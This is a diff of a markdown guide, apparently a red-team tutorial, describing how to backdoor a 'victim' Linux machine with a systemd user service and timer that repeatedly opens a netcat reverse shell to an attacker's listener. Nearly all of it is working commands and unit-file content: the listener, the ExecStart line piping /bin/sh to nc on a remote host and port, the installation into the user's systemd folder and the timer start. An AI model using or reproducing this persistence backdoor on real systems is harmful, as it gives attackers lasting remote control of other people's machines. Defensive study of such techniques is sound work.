@@ -49,13 +49,13 @@ The timer file (`revshell.timer`) uses:
 1. Stand up listener on attacker server
 
 ```sh
-nc -nlvp 4444
+$ nc -nlvp 4444
+listening on [any] 4444 ...
 ```
 
 2. Generate a service file to create the backdoor on the victim
 
 ```ini
-$ cat revshell.service
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
 [Unit]
 Description=A simple reverse shell
@@ -72,7 +72,6 @@ ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp
 3. Generate a timer file to execute the backdoor at regular intervals (every minute in our case)
 
 ```ini
-$ cat revshell.timer
 ; https://www.freedesktop.org/software/systemd/man/systemd.timer.html
 [Timer]
 AccuracySec=1s
@@ -82,18 +81,19 @@ RandomizedDelaySec=4s
 Persistent=true
 ```
 
-4. Install into the systemd user folder on the victim
+4. Install into the systemd user folder on the victim and reload the units
 
 ```sh
-mkdir -p ~/.config/systemd/user/
-ln -s `pwd`/revshell.service ~/.config/systemd/user/
-ln -s `pwd`/revshell.timer ~/.config/systemd/user/
+$ mkdir -p ~/.config/systemd/user/
+$ ln -s `pwd`/revshell.service ~/.config/systemd/user/
+$ ln -s `pwd`/revshell.timer ~/.config/systemd/user/
+$ systemctl --user daemon-reload
 ```
 
 5. Start the scheduled task
 
 ```sh
-systemctl --user start revshell.timer
+$ systemctl --user start revshell.timer
 ```
 
 6. Wait for the shell!
